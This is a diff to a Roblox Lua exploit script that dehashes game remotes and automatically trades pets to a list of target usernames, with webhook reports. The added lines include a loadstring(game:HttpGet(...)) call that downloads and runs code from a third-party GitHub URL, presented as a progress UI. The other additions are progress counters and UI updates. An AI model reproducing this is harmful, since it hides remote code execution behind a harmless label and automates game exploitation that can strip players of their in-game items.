@@ -33,6 +33,18 @@ print("===========================================")
 print("  Multi-Target Auto Trade System v1.0.0")
 print("===========================================")
 
+-- Load Progress UI
+local UILoaded = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PyroXHUB/dadasd/refs/heads/main/progress_ui.lua"))()
+end)
+
+if UILoaded then
+    print("✓ Progress UI loaded")
+    wait(1) -- Let UI animate in
+else
+    warn("⚠ Progress UI failed to load, continuing without UI")
+end
+
 -- Dehash function
 local function dehash()
     local function rename(remotename, hashedremote)
@@ -243,6 +255,13 @@ local function autotrade(username, petCount)
 end
 
 -- Main execution loop
+local totalPetsTraded = 0
+
+-- Initialize UI
+if getgenv().ProgressUI then
+    getgenv().ProgressUI.SetStatus("🔄 Initializing...")
+end
+
 print(string.format("\n📋 Configuration Loaded:"))
 print(string.format("   • Targets: %d", #config.usernames))
 print(string.format("   • Pet Type: %s", table.concat(config.pets_to_trade, ", ")))
@@ -261,6 +280,12 @@ for index, username in ipairs(config.usernames) do
     print(string.format("📊 Target [%d/%d]: %s", index, #config.usernames, username))
     print(string.format("📦 Required Pets: %d", targetPetCount))
     print(string.format("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"))
+    
+    -- Update UI
+    if getgenv().ProgressUI then
+        getgenv().ProgressUI.UpdateTarget(username)
+        getgenv().ProgressUI.UpdateProgress(index - 1, #config.usernames, totalPetsTraded)
+    end
     
     -- Check if player is in server
     if not Players:FindFirstChild(username) then
@@ -323,6 +348,12 @@ for index, username in ipairs(config.usernames) do
         print(string.format("\n✅ Successfully traded %d pets with %s", totalTraded, username))
         sendWebhook(username, totalTraded, "Success")
         table.insert(completedTrades, username)
+        totalPetsTraded = totalPetsTraded + totalTraded
+        
+        -- Update UI
+        if getgenv().ProgressUI then
+            getgenv().ProgressUI.UpdateProgress(index, #config.usernames, totalPetsTraded)
+        end
     end
     
     task.wait(5) -- Cooldown before next target
@@ -331,7 +362,13 @@ end
 print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 print("🎉 All Trades Completed!")
 print(string.format("✓ Success: %d/%d targets", #completedTrades, #config.usernames))
+print(string.format("✓ Total Pets Traded: %d", totalPetsTraded))
 print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+
+-- Complete UI
+if getgenv().ProgressUI then
+    getgenv().ProgressUI.Complete()
+end
 
 -- Final webhook summary
 if config.Webhook ~= "" then
